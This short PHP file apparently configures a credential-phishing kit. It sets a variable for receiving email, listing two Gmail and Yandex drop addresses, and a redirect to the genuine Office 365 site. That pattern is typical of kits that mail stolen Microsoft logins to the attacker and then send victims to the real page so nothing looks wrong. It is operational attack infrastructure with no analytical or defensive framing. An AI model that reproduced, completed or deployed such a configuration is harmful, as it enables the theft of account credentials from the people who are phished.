<?php 
$Receive_email="phcollection.com@gmail.com,phcollection.com@yandex.com";
$redirect="https://www.office.com/";
?>